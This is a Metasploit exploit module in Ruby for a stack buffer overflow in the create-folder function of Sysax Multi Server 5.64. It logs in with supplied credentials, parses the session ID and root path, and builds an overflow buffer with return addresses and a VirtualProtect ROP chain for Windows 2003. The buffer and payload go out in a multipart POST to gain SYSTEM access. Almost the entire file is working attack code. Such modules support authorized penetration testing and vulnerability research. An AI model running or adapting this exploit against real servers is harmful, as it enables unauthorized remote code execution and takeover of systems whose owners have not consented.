##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#	http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Sysax Multi Server 5.64 Create Folder Buffer Overflow',
			'Description'	=> %q{
					This module exploits a stack buffer overflow in the create folder function in
				Sysax Multi Server 5.64. This issue was fixed in 5.66. In order to trigger the
				vulnerability valid credentials with the create folder permission must be provided.
				The HTTP option must be enabled on Sysax too.

				This module will log into the server, get a SID token, find the root folder, and
				then proceed to exploit the server. Successful exploits result in SYSTEM access.
				This exploit works on XP SP3, and Server 2003 SP1-SP2.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=>
				[
					'Matt "hostess" Andreko',
				],
			'References'	=>
				[
					[ 'EDB', '20676' ],
					[ 'URL', 'http://www.mattandreko.com/2012/07/sysax-564-http-remote-buffer-overflow.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars'		=> "\x00\x2F\x0d\x0a", # 0d and 0a are only bad, due to the Rex::MIME replacing 0d with 0d0a in the message#to_s
					'Space'			=> '1299',
					'DisableNops'	=> true,
				},

			'Targets'		=>
				[
					[ 'Windows XP SP3 / Sysax Multi Server 5.64',
						{
							'Rop'		=>	 false,
							'Ret'		=>	 0x77c35459, # push esp #  ret [msvcrt.dll]
							'Offset'	=>	  711,
						}
					],
					[ 'Windows 2003 SP1-SP2 / Sysax Multi Server 5.64',
						{
							'Rop'		=>	 true,
							'Ret'		=>	 0x77baf605, # pop esi; pop ebp; retn 0c; [msvcrt.dll] (pivot)
							'Offset'	=>	 711,
							'Nop'		=>	 0x77bd7d82, # RETN (ROP NOP) [msvcrt.dll]
						}
					],
				],
			'Privileged'	=> true,
			'DisclosureDate'=> 'Jul 29 2012',
			'DefaultTarget' => 0))

		register_options(
				[
					OptString.new('TARGETURI', [true, 'The URI path to the Sysax web application', '/']),
					Opt::RPORT(80),
					OptString.new('SysaxUSER', [ true, "Username" ]),
					OptString.new('SysaxPASS', [ true, "Password" ])
				], self.class)

	end

	def create_rop_chain()
		rop_gadgets = []

		# ROP chains provided by Corelan.be
		# https://www.corelan.be/index.php/security/corelan-ropdb/#msvcrtdll_8211_v7037903959_Windows_2003_SP1_SP2
		if (target == targets[1]) # Windows 2003
			rop_gadgets =
			[
				0x77be3adb, # POP EAX # RETN [msvcrt.dll]
				0x77ba1114, # ptr to &VirtualProtect() [IAT msvcrt.dll]
				0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN [msvcrt.dll]
				0x41414141, # Filler (compensate)
				0x77bb0c86, # XCHG EAX,ESI # RETN [msvcrt.dll]
				0x77bdb896, # POP EBP # RETN [msvcrt.dll]
				0x77be2265, # & push esp #	ret	 [msvcrt.dll]
				0x77bdeebf, # POP EAX # RETN [msvcrt.dll]
				0x2cfe0668, # put delta into eax (-> put 0x00000201 into ebx)
				0x77bdfb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
				0x77bdfe37, # ADD EBX,EAX # OR EAX,3000000 # RETN [msvcrt.dll]
				0x77bdf0da, # POP EAX # RETN [msvcrt.dll]
				0x2cfe04a7, # put delta into eax (-> put 0x00000040 into edx)
				0x77bdfb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
				0x77bb8285, # XCHG EAX,EDX # RETN [msvcrt.dll]
				0x77bcc2ee, # POP ECX # RETN [msvcrt.dll]
				0x77befbb4, # &Writable location [msvcrt.dll]
				0x77bbf75e, # POP EDI # RETN [msvcrt.dll]
				0x77bd7d82, # RETN (ROP NOP) [msvcrt.dll]
				0x77bdf0da, # POP EAX # RETN [msvcrt.dll]
				0x90909090, # nop
				0x77be6591, # PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]
			].flatten.pack("V*")
		end

		return rop_gadgets

	end

	def get_sid

		user = datastore['SysaxUSER']
		pass = datastore['SysaxPASS']

		creds = "fd=#{Rex::Text.encode_base64(user+"\x0a"+pass)}"

		# Login to get SID value
		r = send_request_cgi({
			'method' => "POST",
			'uri'	 => "#{target_uri.to_s}scgi?sid=0&pid=dologin",
			'data'	 => creds
		})

		# Parse response for SID token
		sid = r.body.match(/sid=([A-Z0-9a-z]{40})/)[1]
		print_status "SID: #{sid.to_s}"

		sid.to_s

	end

	def get_root_path(sid)

		# Find the path because it's used to help calculate the offset
		random_folder_name = rand_text_alpha(8) # This folder should not exist in the root dir

		r = send_request_cgi({
			'uri' => "#{target_uri.to_s}scgi?sid=#{sid}&pid=transferpage2_name1_#{random_folder_name}.htm",
			'method' => 'POST',
		})

		# Example message: invalid path: C:\Documents and Settings\Administrator\Desktop\9dk2hdh2.
		# Root Path should be C:\Documents and Settings\Administrator\Desktop  (no trailing slash)
		root_path = r.body.match(/^invalid path: (.*)\\#{random_folder_name}\.$/)[1]
		print_status "Root Dir: #{root_path}"

		root_path

	end

	def exploit

		connect

		sid = get_sid
		root_path = get_root_path(sid)

		buffer = rand_text(target['Offset']-root_path.length)
		buffer << [target.ret].pack('V')

		if (target['Rop'])
			buffer << [target['Nop']].pack('V')*16
			buffer << create_rop_chain()
		end

		buffer << make_nops(15)
		buffer << payload.encoded

		post_data = Rex::MIME::Message.new
		post_data.add_part(buffer, nil, nil, "form-data; name=\"e2\"")
		post_data.bound = rand_text_numeric(57) # example; "---------------------------12816808881949705206242427669"

		r = send_request_cgi({
			'uri'	  => "#{target_uri.to_s}scgi?sid=#{sid}&pid=mk_folder2_name1.htm",
			'method'  => 'POST',
			'data'	  => post_data.to_s,
			'ctype'	  => "multipart/form-data; boundary=#{post_data.bound}",
		})

		disconnect

	end
end